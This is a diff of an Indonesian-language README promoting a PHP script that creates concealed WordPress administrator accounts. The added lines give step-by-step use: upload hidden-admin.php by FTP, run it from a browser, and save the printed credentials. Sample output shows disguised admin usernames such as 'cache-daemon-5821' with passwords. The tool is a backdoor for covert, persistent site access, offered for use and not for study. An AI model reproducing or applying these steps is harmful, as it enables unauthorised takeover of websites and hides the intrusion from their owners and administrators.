@@ -29,3 +29,32 @@ Script PHP canggih yang memungkinkan Anda membuat **user administrator tersembun
 ```bash
 ftp yourdomain.com
 put hidden-admin.php /path/to/wordpress/
+### 🖱️ Langkah 2: Jalankan Script
+**Akses melalui browser:**
+https://website-anda.com/hidden-admin.php
+
+### 📋 Langkah 3: Simpan Credentials
+Setelah dijalankan, script akan menampilkan:
+✅ BERHASIL! User Tersembunyi Dibuat
+
+🔐 Username: system-manager-7841
+🔑 Password: k9@M#xP!qR3$vB8w
+🌐 Login URL: https://website-anda.com/wp-admin
+### 🎪 Contoh Hasil
+
+**Output yang akan Anda lihat:**
+================================
+🚀 WORDPRESS HIDDEN ADMIN TOOL
+================================
+📍 Domain: website-anda.com
+⏰ Timestamp: 2024-01-15 14:30:25
+--------------------------------
+
+✅ USER BERHASIL DIBUAT!
+👤 Username: cache-daemon-5821  
+🔒 Password: pL8@kM#xQ3$vN6!z
+📧 Email: cache-daemon-5821@website-anda.com
+🎯 Role: Administrator
+
+💡 Tips: Gunakan credentials di atas untuk login ke wp-admin
+================================
